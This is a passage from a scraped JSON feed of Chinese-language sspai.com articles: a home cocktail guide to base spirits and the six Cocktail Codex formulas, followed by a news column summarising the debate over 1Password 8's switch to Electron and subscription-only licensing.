，这份「家庭鸡尾酒」调制公式敬请收藏","date":"2021-09-23 09:31:07","description":"\n<blockquote><p>我喜欢酒吧刚开门迎接傍晚客人的时候。屋里的空气还凉爽干净，所有东西都亮晶晶的，酒保正在最后一次照镜子，看领带正不正、头发光不光。我喜欢架子上整整齐齐的酒瓶和闪闪发亮的可爱酒杯，还有那种期待的感觉。我喜欢看着酒保调当晚的第一杯酒，放在清清爽爽的杯垫上，旁边还要放一块叠得漂漂亮亮的餐巾。我喜欢慢慢地品这杯酒。一个安静酒吧里傍晚第一杯安静的鸡尾酒 —— 真是美妙。</p></blockquote>\n<p>想了好久，还是打算用钱德勒「漫长的告别」里面的这一段来做这篇文章的开头。喝酒这件事，在长久以来的历史上，都带有一定的浪漫主义色彩。不论是古代诗人们酒后「斗酒诗百篇」，还是禁酒令时期可爱的人们为了喝上一口酒而留下的一段段传奇的故事，都不断的给「酒」的浪漫添砖加瓦。</p>\n<p>对于酒，我想大多数能够享受它的人，喜欢的都是它给人带来的微醺感觉，让整个人松弛下来，给不管是独处还是朋友聊天带来的那种惬意慵懒的氛围。而调酒，得益于它千变万化的形态与口味，就是一种即使不喝酒的人可能也会喜欢的饮品。</p>\n<h2>就像照片中的主体</h2>\n<p>在鸡尾酒的世界里，基酒就好像是一杯酒的灵魂一样，从本质上决定了这杯酒的气质。如果用摄影做比喻的话，就像一张照片中的主体，能牢牢吸引住观者的目光，哪怕是匆匆一瞥。在这些年的酒的发展过程中，大家逐渐对于调酒使用的基酒的几个品类有了一个统一的认识，大概分为以下六种。</p>\n<h3>温暖的麦子 - 威士忌 Whiskey</h3>\n<p>威士忌这款酒，本身就足以洋洋洒洒写一大篇文章来介绍，从产地、风味、风土等等。在这里给自己挖一个坑，日后等到自己喝的足够多了，再来专门写吧。作为调酒的基酒，如果用到很贵的威士忌的话，会略显奢华，这这个意义上来讲，市面上比较好买的一些平价威士忌，例如 Jim Beam 波本就是很好的入门调酒选择。不过，可能波本威士忌本身的风味对于一些人来说是需要一些适应时间的，我就是一些人中的其中一员。本来以为差点要放弃威士忌这个品类，直到我接触了苏格兰威士忌，强烈推荐 Speyside 花果香的单一麦芽作为入门款。</p>\n<h4>代表调酒 Old Fashioned</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/c621739073e7cabc6d2e314164f120dd.jpg\"><figcaption>Picture from Cocktail Codex</figcaption></figure><p>作为这款基酒的代表调酒，Old Fashioned 从名字上就自亮身份，历史悠久，是经典的调酒。通常来说，越是经典的东西就越是简单，所以这款酒的调制方式也简单无比：只需要一块方糖，2-3滴苦精，再加入2 shot 波本威士忌最后以橙皮装饰即可。</p>\n<p>在具体操作的时候，可以将方糖、苦精和波本放入调制杯中加满冰块，搅拌至酒体降温，然后古典杯放入大冰块，再倒入降温完成的酒体，然后拧出橙皮皮油最后放入杯中装饰。</p>\n<p>Old Fashioned 是一杯颜值非常取决于杯子的酒，条件允许的话建议买一个好看的古典杯，平时用来纯饮威士忌或者调酒都很不错。</p>\n<h3>热情的多肉 - 龙舌兰 Tequila</h3>\n<p>对于 Tequila 的认知，恐怕很多人都和我一样是从 Shots 开始的。柠檬、食盐、喧嚣的 Pub、热烈的气氛，光是这几样，基本上酒定义了它本身的气质。这个来自墨西哥的极富地域风情的酒，带给人的是一种热烈的感觉。抛开这种极具仪式感的喝法，相信我，龙舌兰纯饮并没有想象中的那么美妙。用时下比较流行的词语来说，大概龙舌兰是一种「氛围感」烈酒。</p>\n<h4>代表调酒 Tequila Sunrise</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/1173d0b3c948ba7a89b668d81ed24490.jpg\"><figcaption>Picture from Cocktail Codex</figcaption></figure><p>Tequila Sunrise 是一款颜值上给人以「人畜无害」的感觉。橙汁的黄加上红石榴糖浆的红色很好的营造出了一种日落的氛围。制作方式也是简单至极，拿一个高球杯，装满冰块，加 1 shot Tequila，橙汁补至七分满，用吧勺搅拌，再将 10ml 红石榴糖浆沿吧勺留下。Tequila 本身的烈酒味被橙汁很好的盖住了，所以喝起来酒精感也没有那么重，我愿称之为「新手友好第一杯」。</p>\n<h3>不太甜的甘蔗 - 朗姆酒 Rum</h3>\n<p>由于酒的酿造本质，决定了酒本身和农作物之间有着千丝万缕的联系。朗姆不同于其他大多数以谷物为原料的酒的就是它是以甘蔗为基底的。但如果你以为用甘蔗酿造的酒会带有甘蔗淡淡的甜味，那恐怕就错了。朗姆澄清的白色酒体，入喉辛辣，绝对是喝醉之前不会纯饮的一种酒。</p>\n<h4>代表调酒 Rum and Coke</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/8ef90a7c4bfab033ff6f080572b22709.jpg\"><figcaption>Cuba Libre from My Home Bar</figcaption></figure><p>这可能是我在家最喜欢做的一杯酒。Rum and Coke 还有一个更加浪漫的名字 Cuba Libre （自由古巴），是一杯非常清爽可口的 Highball 鸡尾酒。坊间传闻这杯酒起源于 20 世纪初的古巴，历史背景是当时古巴在美西战争中取得了独立，Cuba Libre 也是古巴独立运动的口号，当时因为其配方简单原料价格低廉，成为最受欢迎的酒精饮料之一。</p>\n<p>制作过程很简单，在杯中加满冰块，加入柠檬汁 5 ml，加入3滴苦精，再加入1 shot 朗姆然后搅拌让酒体充分冷却，然后再用可口可乐加满，提拉Stir，最后用黄柠檬皮拧出气雾，放入杯中。喝起来酸酸甜甜又起起泡泡，简直是夏日必备饮品。</p>\n<h3>疯狂的土豆 - 伏特加 Vodka</h3>\n<p>来自战斗民族的伏特加，秉承了战斗民族的特性，在酒中追求的是纯净度而不是风味。虽然背负着生命之水的美名，但是伏特加作为基酒在调酒的世界里还是非常的万金油，与各种酒搭配在一起都非常的协调，丝毫不出挑。</p>\n<h4>代表调酒 Moscow Mule</h4>\n<p>和 Cuba Libre 一样，我认为这也是一杯特别适合炎炎夏日的一杯调酒，冰冰凉凉，气气泡泡。同时我认为这可能是在酒吧最有辨识度的一个酒，因为它的容器比较特别，要用标志性的铜杯容器。这个容器就涉及到这杯酒的起源了，虽然不知真假，不过调酒后面这些传奇性的故事往往是酒文化最有意思的地方。这杯酒的三种主要元素，铜杯，伏特加和姜汁啤酒再当时美国都面临着营销上困扰，销售停滞，于是这三个人某天一拍即合决定用这三个东西做一杯调酒来带动这三类产品的销售额，莫斯科骡子就诞生了。</p>\n<p>这杯酒调制方法也非常简单，把 15ml 柠檬汁（最好是青柠汁）挤到杯子里面，加入 1 shot vodka，再加入满杯碎冰，最后加入干姜味的汽水或者姜汁啤酒轻轻搅拌，最后再加入一片柠檬角。</p>\n<h3>穿着白大褂的杜松子 - 金酒 Gin</h3>\n<p>虽然说不是所有的 Gin 都是以杜松子为主要调味，不过在大多数情况下称 Gin 为杜松子酒应该也是没有问题的。Gin 是我认为喝到嘴里之前最香的酒，各种个样的调味加上杜松子的主要香气，真的很让人上头。</p>\n<p>有趣的是，金酒的诞生传说是作为药品来的。因为杜松子传统上一直被当作利尿、解热与治疗痛风的药材使用，所以 Gin 最开始是被当作利尿剂来使用的。</p>\n<h4>代表调酒 Gin Tonic</h4>\n<p>Gin Tonic 应该是以 Gin 为基酒的调酒里面知名度最高的一杯，深受大家喜爱。调制方法是标准的 Highball 调制方法，拿一个冻过的高球杯，满冰，加入 1 shot Gin，再加满汤力水，提拉 Stir，挤一些柠檬皮油，再用柠檬皮做装饰。</p>\n<p>正如 Gin 的诞生和医学相关一样，Gin Tonic 这杯酒也带有疗愈的色彩。在殖民时代，在热带地方作战的欧洲士兵会饮用奎宁水（Quinine，主要用途是解热与对抗疟疾）来抵御热带疾病，但是奎宁水本身非常的苦涩难以下咽，所以这些海外作战的士兵发现加入 Gin 会让奎宁水变好喝，这种配方后来被带回祖国之后就渐渐演变成了如今我们饮用的 Gin Tonic。</p>\n<h3>高贵的葡萄 - 白兰地 Brandy</h3>\n<p>作为一种以葡萄为原料酿造而成的蒸馏酒，闻起来味道就酸酸甜甜感觉很好喝，也难怪白兰地通常被称为「葡萄酒的灵魂」，以法国干邑地区的最为著名。为什么被称为「葡萄酒的灵魂」呢，因为最开始白兰地是为了解决葡萄酒变质滞销的问题，就用葡萄酒作为原料加工成葡萄蒸馏酒。这时期加工的葡萄蒸馏酒还是无色。后来人们偶然发现存于橡木桶中的葡萄蒸馏酒味道更加的芳香浓郁，酒体颜色也变成了琥珀色，所以奠定了当代白兰地的酿造方式 - 发酵、蒸馏、贮藏。</p>\n<h4>代表调酒 Sidecar</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/f5d9b865112b261f19c6f6d5dd133963.jpg\"><figcaption>Picture from Cocktail Codex</figcaption></figure><p>Sidecar 是一杯典型的 Daiquiri 架构（后面会详细解释）的鸡尾酒，调制相对来说也不复杂，1 shot 干邑白兰地，加入15 ml 君度橙味利口酒，再加15 ml 柠檬汁，加冰 shake，最后也是最重要的一步：倒入好看的高脚杯中。</p>\n<p>至于为什么叫做 Sidecar，正如很多酒的来源不可考一样也没有非常确实的来源，有一种说法我觉得还蛮有意思，是指酒吧在给客人上酒的时候，用摇壶将酒倒出后，为避免浪费，摇壶中剩下的一小部分回倒入一个小杯子中，和主酒一起上，就像挎斗摩托车一样。</p>\n<h2>解构鸡尾酒</h2>\n<p>虽然在鸡尾酒的世界里基酒只有六大类，可是以这几种基酒搭配调制而成的鸡尾酒却是难以尽数。在《Cocktail Codex》这本书中，将调酒分为了六大类，相当于总结了六个万能公式，搞懂了这六种公式之后，基本上可以套用任何一种名字看起来奇奇怪怪的酒。</p>\n<p>当然我认为这六大类在现实生活中更有用的一方面是，它提供了一种架构性的思路，给去酒吧的你提供了一些指导性建议。例如，你想要一个什么烈酒作为基底，想要一些偏酸还是偏甜的风味。或者你有一种喜欢的鸡尾酒，如果知道了它属于哪一种架构，可以尝试着根据这种架构去换着点一些有趣的其他风味，酒保一般是不会拒绝这种有想法的客人的。跳出酒单上奇奇怪怪的名字，直击风味的本质，做个酷酷的酒吧常客。</p>\n<h3>The Old-Fashioned</h3>\n<p>第一种就是上面介绍基酒中举的例子，它的公式如下：</p>\n<blockquote><p>烈酒 + 糖 + 苦精 + 冰 + 柑橘水果做装饰</p></blockquote>\n<p>如果用这个公式去看的话，各种基底的 Old fashioned，Sazerac 等调酒，都算是这种搭配架构下的鸡尾酒。在这个公式的基础上延展开来的话，一杯很适合冬天的热调酒 Hot Toddy 其实也是这种架构，同样是威士忌（烈酒）+ 方糖 + 苦精 + 柠檬装饰，唯一的变化是冰变成了热水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/20/bec178a05063a49da1c7521510f962d6.JPG\"><figcaption>Hot Toddy from My Home Bar</figcaption></figure><h3>The Martini</h3>\n<p>第二种是以 Martini 这种架构来调制的酒，它的公式如下：</p>\n<blockquote><p>烈酒（一般为金酒或者伏特加） + 加香型葡萄酒</p></blockquote>\n<p>Martini 本身不用说是用 Gin 加上 Vermouth 调制，可以用同种架构来解释的还有比如说 Negroni，Manhattan 等等。就拿我常做的 Negroni 举例来说，如果按照 Martini 这种架构来解释的话，是金酒（烈酒）做底，再加入 Sweet Vermouth （加香型葡萄酒），那么剩余的两种原料中，Campari 提供了 Negroni 里面的苦味并和 Sweet Vermouth 里面的甜做了一种很好的苦甜中和，最后装饰用一片橙皮。</p>\n<p>Negroni 虽然从做法上来看，是一杯很简单的酒，但其实，其中的苦苦甜甜的配比真的要看个人喜好来慢慢尝试。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/c6217f107dbaf45b1d3b27c2d98d1b3c.jpg\"><figcaption>Negroni from My Home Bar</figcaption></figure><h3>The Daiquiri</h3>\n<p>第三种是 Daiquiri 架构的调酒，公式如下：</p>\n<blockquote><p>烈酒 + 柑橘酸 + 糖</p></blockquote>\n<p>这其中有非常火的就比如 Whiskey Sour (威士忌酸)还有 Gimlet (螺丝起子)。如果看过钱德勒「漫长的告别」的这本书的话，应该对螺丝起子这杯酒非常熟悉，因为这是男主去酒吧经常点的一杯酒，书中是这样描述的：</p>\n<blockquote><p>我们坐在维克多餐厅的酒吧一角喝螺丝起子。“这儿不会调酒，”他说，“他们所谓的螺丝起子只是青柠或柠檬汁兑金酒，加一丁点儿砂糖和苦味酒。真正的螺丝起子是一半金酒一半罗斯牌青柠汁，其他什么都不加。能打得马丁尼落荒而逃”</p></blockquote>\n<p>在书里，就已经写出了这杯酒的调制方法，不同于 Daiquiri 本身使用 Rum 作为烈酒基底，Gimlet 用的是金酒，再加上青柠汁的酸，再加上简单糖浆，几乎可以完美的用这个架构来解释。另外如果你想要打得 Martini 落荒而逃的话，记得要用螺丝牌青柠汁哦（手动狗头）。</p>\n<h3>The Sidecar</h3>\n<p>第四种架构是 Sidecar，公式是：</p>\n<blockquote><p>烈酒 + 柑橘酸 + 利口酒</p></blockquote>\n<p>Sidecar 本身用这种架构解释的话，就是：干邑（烈酒）+ 柠檬汁（柑橘酸）+君度（橙味利口酒）。如果我们把核心的烈酒基底换成 Tequila 的话，那我们就可以很轻松的解锁另外一种酒 Magarirta。如果把烈酒换成金酒的话，就是 White Lady。那么同样的逻辑，我们把提供风味的橙味利口酒换成其他水果风味的话，会解锁更多的调酒，你甚至可以创造一款属于带有自己个人家乡或者风味印记的调酒。</p>\n<p>另外值得一提的是，Sidecar 架构的调酒，可以很好的去练习「沾盐边」这个技巧。我个人的经验之谈是，不要用杯壁很厚的杯子去沾盐边，要保证杯子完全干燥之后再用柠檬角湿润杯边。</p>\n<h3>The Whiskey Highball</h3>\n<p>第五种架构就是 Whiskey Highball，也是最适合夏日畅饮的调酒架构，公式如下：</p>\n<blockquote><p>一份烈酒 + 两份长饮</p></blockquote>\n<p>其中，长饮就比如姜汁汽水，汤力水，气泡水，果汁等。前面介绍的 Cuba Libre 就属于这种架构，还有深受喜欢的 Gin Tonic也是。最近大火的便利店调酒大多数也属于这种调酒架构。所以，知道了这个架构之后，可以去自己探索一下便利店调酒的快乐啦！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/13/6efd827369bfbe76b425bcea77415afe.jpg\"><figcaption>Bloody Mary from My Home Bar</figcaption></figure><h3>The Flip</h3>\n<p>第六种架构是 Flip，是一种偏奶味向的一种调酒架构，公式如下：</p>\n<blockquote><p>烈酒/葡萄酒 + 蛋/奶 + 糖</p></blockquote>\n<p>在 Cocktail Codex 这本书里面对于 Flip 的描述是这样的：</p>\n<blockquote><p>Flip - A drink comprised of booze, sugar and whole egg, served cold</p></blockquote>\n<p>但其实在实际操作层面，用生鸡蛋涉及到更加复杂的卫生问题以及处理方式，在这种架构下家庭调酒建议可以尝试的就比如 White Russia 这种完全用不到鸡蛋的咖啡风味调酒。里面的蛋/奶元素完全用奶油或者奶来替代。另外大家更加耳熟能详的可能是 Irish Coffee （爱尔兰咖啡），就使用 威士忌（烈酒）+ 咖啡（风味）+ 糖浆 + 奶油 来调制而成的。调制热酒一个重要的步骤是提前用热水热杯，而且记得最好用个「带把儿」的杯子。</p>\n<h2>还有一些没说的</h2>\n<p>正如好多有趣但可能并无用的事情一样，调酒这件事，是一项复杂而繁琐的系统工程。这篇文章里面，并没有讲述完全的包括但不限于以下一些事情，希望以后能够慢慢和大家一起学习分享。</p>\n<ul>\n<li>调酒器具</li>\n<li>炫酷又无用（或有用）的调酒技法</li>\n<li>可爱又好看的杯具们</li>\n<li>基础的家庭吧台配置</li>\n<li>预调制糖浆的分类以及保存方法</li>\n<li>奇奇怪怪香味利口酒</li>\n</ul>\n<p>在调酒的世界里，我也只是个入门者，凭借着下班后一点点时间自己学习探索，称其为放松身心的一种方式也未尝不可。Home Bar 的酒和调酒器具大多都是一瓶瓶一件件买回来的，是觉得自己想要调一杯酒的时候发现缺了某种原料才去买的。所以也许，对于还在「调酒」这件事门口踟蹰或者看了这篇文章想要进门的你来说，可以从一杯简单的 Highball 开始，尝试一下自己制作「吨吨吨」的快乐。</p>\n","link":"https://sspai.com/post/68125"},{"title":"订阅、云服务、套壳——关于 1Password 8 的是非争议","date":"2021-09-23 07:31:22","description":"\n<h2>导读</h2>\n<p>欢迎阅读「网事深读」栏目。这是我们为会员准备的科技资讯栏目。</p>\n<p>与注重时效的常见资讯类内容不同，「网事深读」只关注距最初发生已有一段时间的事件。我们认为，「科技新闻」似乎已成了一个矛盾体——互联网号称有永恒的记忆，却能转身间将轰动一时的讨论冲刷殆尽；看似无限包容，却往往只给最偏颇的声音递上传声筒。在这样的背景下，要全面、中立地观察事件，有一段「静置期」是必要的。</p>\n<p>本栏目内容通常由三部分组成：</p>\n<ul>\n<li>在第一部分（事件梳理）中，我们将按时间顺序整理事件截至当前的发展过程，并补充必要的背景信息，帮助读者了解来龙去脉。为此，我们将尽量引用来自当事方的第一手说法，或引述相对中立的第三方报道。</li>\n<li>在第二部分（支持/反对观点）中，我们则汇总关于事件具有代表性的观点，根据其正反立场分类，使读者能兼听多个角度的意见。</li>\n<li>在第三部分（相关事件/延伸阅读）中，我们将挑选一些与话题相关的事件或讨论，作为「他山之石」启发思考。</li>\n</ul>\n<p>你可能发现上述结构并没有为我们自己预留表达观点的空档；这是有意为之的选择——退到幕后，承担「递话筒」的职能，帮助读者能在博闻众说的基础上做出自主判断。</p>\n<p>当然，如果你对本栏目话题有任何补充材料或见解，欢迎在评论区或会员话题群一起分享、讨论。</p>\n<hr>\n<h2>事件梳理</h2>\n<p><a href=\"https://1password.com/\">1Password</a> 是一款知名的密码管理工具，运营主体为加拿大公司 AgileBits, Inc.。</p>\n<p>1Password 最初发布于 2006 年，当时只有 Mac 版，密码库以一个独立数据库的形式存储在本机硬盘、或用户指定的 Dropbox 等第三方网盘中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/cbaf6a2eb6308f8aa9df9d738285125a\" alt=\"\"></figure><p>后来，1Password 逐渐扩展到 iOS、Android、Windows 等平台，并于 2015 年末推出了自己的同步服务（<a href=\"http://1password.com/\">1Password.com</a>），许可收费模式也改为以订阅制为主，但独立密码库功能和买断制许可仍然保留。</p>\n<p>2021 年 5 月，1Password 团队宣布推出 Linux 版客户端。根据在同期发表的 <a href=\"https://dteare.medium.com/behind-the-scenes-of-1password-for-linux-d59b19143a23\">Medium 文章</a>，该版本使用了一种「混合」架构，其中前端（软件界面）部分使用 Electron 框架编写：</p>\n<blockquote><p>1Password for Linux 是我们第一款混合 [架构] 应用。[…] <strong>后端</strong>用 Rust 写成，这个语言以其安全性和高性能而闻名。</p></blockquote>\n<blockquote><p>[…] <strong>前端</strong>使用 web 技术，这让我们得以能打造 1Password 的全新设计语言；不仅美观，而且让我们 [的开发工作] 高度敏捷、快速迭代。在为 <a href=\"http://1password.com/\">1Password.com</a> [上的网页版] 和浏览器插件开发界面时，我们就用了 TypeScript 和 React，并大获成功。因此，这次 [继续使用这些框架] 也就是自然而然的选择了。</p></blockquote>\n<blockquote><p>我们此次发布 Linux 版的主要目标之一，就是打造一个<strong>共用的内核</strong>，其作用在于与 <a href=\"http://1password.com/\">1Password.com</a> [上的服务端] 通讯，并集中完成尽可能多的计算任务。我们希望在所有客户端共用一个代码库，实现集中开发功能、一次性修正漏洞。我们还希望通过组件架构的设计，避免这个共用的内核不会被恶意利用。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/18657924e6cb05f910db1af9e6f7bd01\" alt=\"\"></figure><p>随后，在 8 月，1Password 团队<a href=\"https://blog.1password.com/1password-8-for-mac-is-now-in-early-access/\">宣布</a> Mac 平台的下一版本——1Password 8 进入初期测试（early access）阶段，并开放下载。</p>\n<p>根据同期发布的<a href=\"https://appleinsider.com/articles/21/08/16/users-lobby-1password-to-abandon-new-electron-version\">官方博客文章</a>，不同于该软件过去在 Mac 平台一直坚持的原生框架开发路径，1Password 8 也已转向与 Linux 版相同的混合架构，即使用 Electron 框架编写用户界面，而原因则是「不得已而为之」：</p>\n<blockquote><p>如何为 macOS 开发 1Password 8，可能是我们做过的最复杂的决策。[…] 我们决定采取「双分支」的做法，开发两个 Mac 应用。其中一个用 SwiftUI 编写，面向最新版操作系统；另一个使用网页 UI，从而支持旧版系统。</p></blockquote>\n<blockquote><p>尽管 SwiftUI 让我们在 iOS 和 macOS 版本之间可以共享代码的比例达到有史最高，我们还是发现需要为某些组件单独开发 [两种] 实现，才能在相应的系统上显得自然，有时整个功能都得单独开发。[…]</p></blockquote>\n<blockquote><p>最终，我们痛苦地决定停止用 SwiftUI 开发 Mac 应用，把 SwiftUI 的开发集中在 iOS 上，靠 Electron 版应用支持所有版本的 Mac 操作系统。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/b56edae2441dbc861bf7b7fcbb62433b\" alt=\"\"></figure><p>与开发框架的变动同步，1Password 8 的付费模式也发生了变化，取消了一直存在的「买断制」许可，只保留近年新增的订阅制。</p>\n<p>不过，官方最初并没有明确指出这一点，只是到了用户在官方论坛发帖质询后，创始人 Dave Teare 才<a href=\"https://1password.community/discussion/comment/601917/#Comment_601917\">出面回应</a>：</p>\n<blockquote><p>鉴于 1Password 会员服务备受欢迎，而 <a href=\"http://1password.com/\">1Password.com</a> [的网页版服务] 在功能上远胜其他 [既有客户端]，我们下一代 1Password 应用将专注于会员 [订阅制服务]。[…] 现在是时候告别独立买断许可证了。</p></blockquote>\n<p>对现有买断制用户，则提供专属优惠鼓励迁移：</p>\n<blockquote><p>[为表感谢，] 只要将你的现有许可证邮件发给我们，即可获得三年期的五折优惠。[…] 我们理解有人希望只在明确同意时付款；如果是这样，我们也提供了一项特惠：你可以花 99 美元购买一张价值 150 美元的礼品卡，足够使用 1Password 三年多。</p></blockquote>\n<p>在<a href=\"https://1password.community/discussion/comment/602340/#Comment_602340\">另一则回复</a>中，Teare 则明确表示将停止提供独立密码库的功能，但不排除未来推出自建（self-host）服务端的选项：</p>\n<blockquote><p>下一代 1Password 应用将仅能与 <a href=\"http://1password.com/\">1Password.com</a> [上的订阅制服务] 同步。[…] [Mac 上的] 1Password 7 不受影响，现有的同步方式均能继续使用。</p></blockquote>\n<blockquote><p>[…] 我们已经在琢磨允许用户自主搭建云服务的思路。那将成为你个人专属的 1Password 服务，完全运行在你的主机，或者你掌控的云端。但一个大问题是：有多少用户朋友需要这个功能？[…] 请参与<a href=\"https://1password.community/home/leaving?allowTrusted=1&amp;target=https%3A%2F%2Fsurvey.1password.com%2Fself-host%2F\">这项调查</a>，帮助我们进一步理解你的使用场景。</p></blockquote>\n<h2>反对观点</h2>\n<p>1Password 宣布上述开发方向和商业模式调整后，受到了大量质疑。</p>\n<p><strong>最多的批评意见集中于改用 Electron 开发 Mac 版的决策。</strong> 常见的角度包括：</p>\n<ul>\n<li>新版界面显得不够「原生」。即使 1Password 8 在设计上试图模仿 Mac 原生应用的外观，但受限于 Electron 框架基于网页技术的本质，仍然留下了很多露出「套壳」本性的破绽。最典型的例子就是「偏好设置」界面——不再是独立的窗口，而是位置固定的一个模态对话框。</li>\n<li>Electron 在安全性方面的历史称不上光彩。过去几年中被发现的安全漏洞曾影响到 Slack、Skype 等知名应用，可能导致任意执行代码等后果。尽管这不能代表 Electron 当下的安全状况，但考虑到 1Password 作为敏感信息管理工具的定位，的确不免让人产生「自废武功」的担心。</li>\n<li>一些反馈称 Electron 版本的 CPU、内存资源占用和耗电都高于原生版本（值得注意的是，这方面目前并无严谨测试结果，不少评论更是只看到 Electron 就直接得出了吃性能和耗电的结论）。</li>\n<li>受限于 Electron 目前对 ARM 架构的适配进度，针对 Intel 和 Apple Silicon 机型的安装包不能通用（即提供 Universal Binary 版本），只能分别提供。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/ecfb6d1aa93da2fd5930a05e12f1d2df\" alt=\"\"></figure><p>相比之下，<strong>对于全面采用订阅制的批评则相对没有那么密集</strong>。这或许是因为 1Password 已经在过去几年中逐步淡化买断制许可的地位（只留下一个很不明显的购买入口，需要花一番工夫才能买到），而不能接受订阅制的用户已有相当比例先行离开了。此外，仅从成本上计算，官方为老用户提供的前述优惠方式也确实并不会比定期购买大版本升级花费更多。</p>\n<p>不过，仍然有一些观点<strong>对仅保留订阅制、以及相关的取消独立密码库的变更提出了合理质疑</strong>。</p>\n<p>例如，名为「MikeV99」的用户对于订阅制的价值<a href=\"https://1password.community/discussion/comment/603660/#Comment_603660\">提出</a>了一种尽管罕见、但也引人思考的疑问：</p>\n<blockquote><p>我夫人今年 80 岁了，我明年一月也要满 80 岁。我做了你们这么多年顾客，升级过很多版本。如果我不按年订阅，终身订阅要收多少钱？</p></blockquote>\n<p>名为「thundersparrow」的用户则<a href=\"https://1password.community/discussion/comment/606748/#Comment_606748\">提出</a>了一种可以接受订阅制、但不能接受在线密码库的合理场景：</p>\n<blockquote><p>我是个技术支持顾问，为多个客户工作。对于每个客户，我都会创建一个本地密码库存放这位客户的密码。</p></blockquote>\n<blockquote><p>我使用 Tresorit（类似于更安全的 Dropbox）作为主要的数据同步服务，通过它的文件夹同步功能来同步 macOS 上的所有 1Password 密码库。这在多台 macOS 设备上运行良好，甚至还能用来和为同一客户工作的同事协作。</p></blockquote>\n<blockquote><p>我还会选择一些密码库，通过无线局域网同步功能同步到 iOS 设备上。我没有任何一个密码库通过 <a href=\"http://1password.com/\">1Password.com</a> 同步。[…]</p></blockquote>\n<blockquote><p>我不会接受把密码库迁移到 <a href=\"http://1password.com/\">1Password.com</a> 上，因为这违反了「分而治之」（the separation of concerns）的原则。</p></blockquote>\n<p>还有一些意见<strong>对 1Password 快速融资、投入企业市场提出质疑</strong>，认为这反映了一种「忘记初心」的倾向。这里的背景是 1Password 团队于 2019 年和 2021 年两次接受风险投资机构 Accel 的投资，投资额分别为 2 亿和 1 亿美元，投后估值已达到 20 亿美元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/a72b0389085169eb46edf72b32ab952c\" alt=\"\"></figure><p>例如，开发者 Drew McCormack <a href=\"https://twitter.com/drewmccormack/status/1426586869408665606\">认为</a>：</p>\n<blockquote><p>我得承认当初没理解 1Password 拿风投的原因。回头看来，我没意识到它已经不再是个密码管理应用，而蜕变成一个账户托管服务了。这就很说得通了。弯转得妙啊。</p></blockquote>\n<p>此外，不少用户表示比起功能和价格变化，更令他们感到不满的是<strong>官方避重就轻、顾左右而言他的回应态度</strong>。</p>\n<p>例如，Hacker News 用户「bgentry」<a href=\"https://news.ycombinator.com/item?id=28143821\">表示</a>：</p>\n<blockquote><p>最可气的地方在于他们的客服团队一上午都在 Twitter 上误导别人，而不是老实回答新版是不是 Electron [写的]，[说什么 「<a href=\"https://twitter.com/1Password/status/1425429965747720200\">还是原生的</a>」「<a href=\"https://twitter.com/1Password/status/1425429965747720200\">后端是用 Rust 写的</a>」「<a href=\"https://twitter.com/1Password/status/1425470169133031435\">更快更灵敏</a>」。]</p></blockquote>\n<p>用户「kup0」则<a href=\"https://news.ycombinator.com/item?id=28148070\">表示</a>：</p>\n<blockquote><p>号称「顾客用钱包投票」选择了订阅制是很虚伪的。[…] 作为软硬件用户，我情绪上真的很烦老是遇到这样的反衬：喜欢一个产品、却对做产品的公司极度失望。</p></blockquote>\n<h2>支持观点</h2>\n<p>尽管质疑声音颇多，也有不少一些观点则对 1Password 表达了支持，或至少表示理解。</p>\n<p>一些人指出，<strong>对 Electron「膝跳反应」式的批评是非理性的</strong>。较有代表性的是开发者 Thaddeus Ternes 的<a href=\"https://twitter.com/thaddeus/status/1427005912842133512\">推文串</a>：</p>\n<blockquote><p>UI [用户界面] 工具的决策和开发时间是一大商业风险。在 Apple 平台上，新工具的功能几乎从不会向后移植到旧版。选择支持旧版操作系统，就要放弃 [新的] 平台功能。相反，如果选择新工具，目标受众就很有限，每年增增减减的意外 [功能] 变动也只能由你承担。</p></blockquote>\n<blockquote><p>但如果选择 Electron，就能 [兼顾] 支持旧版的系统和现代的功能，功能支持和排期也有清晰的路线图。Electron 实际上是一种降低开发风险的方式（有的服务商过去几十年就是靠帮人降低开发风险赚了大钱）。甚至可以说 Apple 的保密就是在强迫别的公司去用 Electron。</p></blockquote>\n<blockquote><p>我本身并不很喜欢 Electron，但考虑到做软件生意的各种内在挑战，如果能不花钱就将风险转移出去，那是很有吸引力的。</p></blockquote>\n<p>另一些观点指出，1Password 弃用原生框架而转采 Electron 的决策中，<strong>Apple 作为第一方、怠于提供良好的开发框架，也有一部分责任</strong>。Jason Snell <a href=\"https://sixcolors.com/post/2021/08/not-important-enough-1password-abandons-its-native-mac-app/\">撰文指出</a>：</p>\n<blockquote><p>问题的根源在于：1Password 是以「亲 Mac 阵营开发者」的身份起家的，现在却认定 Mac 不够重要了。[官方博客文章] 很清楚地表明了 AgileBits 的优先级。[…] AgileBits 愿意在 iOS 上多花功夫 [使用 SwiftUI 开发]，因为这是个重要的平台，而 SwiftUI 显然是它的未来。但在 Mac 上实现 SwiftUI 就要做很多重复工作了。[…] [他们博客文章等于在说，] Mac 很重要，但没有重要到让我们做一个专属应用。这道出了 Mac 软件未来之痛。</p></blockquote>\n<blockquote><p>Apple 也难避其咎。如果 SwiftUI 真的是一统 Apple 各平台的钦定工具，那 1Password 就会用上了。[…] 一个历史悠久、受人喜爱的 Mac 应用被扔进废纸篓，被一个网页应用取而代之。这事不是没有先例；不幸的是，也不会后无来者。</p></blockquote>\n<p>还有人认为，<strong>并不存在一种一以贯之的「原生 Mac 应用设计」</strong>（有时被称为「不妥协的 Mac 应用」，<a 